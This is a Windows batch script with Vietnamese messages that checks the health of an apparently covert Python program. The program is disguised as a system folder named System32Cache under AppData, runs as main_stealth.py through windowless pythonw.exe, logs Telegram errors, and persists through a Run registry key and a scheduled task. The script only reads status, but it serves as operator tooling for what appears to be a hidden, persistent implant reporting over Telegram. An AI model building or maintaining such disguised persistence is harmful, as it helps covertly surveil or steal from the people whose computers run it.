@echo off
chcp 65001 >nul
echo ========================================
echo KIỂM TRA TRẠNG THÁI ỨNG DỤNG
echo ========================================
echo.

REM Kiểm tra thư mục cài đặt
set INSTALL_DIR=%APPDATA%\Microsoft\Windows\System32Cache
echo [1] Kiểm tra thư mục cài đặt: %INSTALL_DIR%
if exist "%INSTALL_DIR%" (
    echo     [OK] Thư mục tồn tại
    if exist "%INSTALL_DIR%\main_stealth.py" (
        echo     [OK] File main_stealth.py tồn tại
    ) else (
        echo     [ERROR] File main_stealth.py KHÔNG tồn tại!
    )
    if exist "%INSTALL_DIR%\config.py" (
        echo     [OK] File config.py tồn tại
    ) else (
        echo     [ERROR] File config.py KHÔNG tồn tại!
    )
) else (
    echo     [ERROR] Thư mục KHÔNG tồn tại!
)
echo.

REM Kiểm tra process đang chạy
echo [2] Kiểm tra process đang chạy:
tasklist /FI "IMAGENAME eq pythonw.exe" /FI "WINDOWTITLE eq *" 2>nul | find /I "pythonw.exe" >nul
if errorlevel 1 (
    echo     [WARNING] Không tìm thấy pythonw.exe đang chạy
) else (
    echo     [OK] pythonw.exe đang chạy
    echo     Chi tiết:
    tasklist /FI "IMAGENAME eq pythonw.exe" 2>nul
)
echo.

REM Kiểm tra log lỗi
echo [3] Kiểm tra log lỗi:
set LOG_FILE=%INSTALL_DIR%\temp\error.log
if exist "%LOG_FILE%" (
    echo     [OK] File log tồn tại
    echo     Nội dung 20 dòng cuối:
    echo     ----------------------------------------
    powershell -Command "Get-Content '%LOG_FILE%' -Tail 20 -Encoding UTF8"
    echo     ----------------------------------------
) else (
    echo     [WARNING] File log KHÔNG tồn tại
)
echo.

REM Kiểm tra log Telegram
echo [4] Kiểm tra log Telegram:
set TELEGRAM_LOG=%INSTALL_DIR%\temp\telegram_error.log
if exist "%TELEGRAM_LOG%" (
    echo     [OK] File log Telegram tồn tại
    echo     Nội dung 20 dòng cuối:
    echo     ----------------------------------------
    powershell -Command "Get-Content '%TELEGRAM_LOG%' -Tail 20 -Encoding UTF8"
    echo     ----------------------------------------
) else (
    echo     [INFO] File log Telegram KHÔNG tồn tại (có thể chưa có lỗi)
)
echo.

REM Kiểm tra Windows Startup
echo [5] Kiểm tra Windows Startup:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "System32Cache" >nul 2>&1
if errorlevel 1 (
    echo     [WARNING] Không tìm thấy trong Registry Startup
) else (
    echo     [OK] Đã thêm vào Registry Startup
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "System32Cache"
)
echo.

REM Kiểm tra Task Scheduler
echo [6] Kiểm tra Task Scheduler:
schtasks /Query /TN "System32Cache" >nul 2>&1
if errorlevel 1 (
    echo     [WARNING] Không tìm thấy trong Task Scheduler
) else (
    echo     [OK] Đã thêm vào Task Scheduler
    schtasks /Query /TN "System32Cache" /FO LIST /V
)
echo.

echo ========================================
echo HOÀN TẤT KIỂM TRA
echo ========================================
echo.
echo Để test kết nối Telegram, chạy: python TEST_TELEGRAM.py
echo.
pause

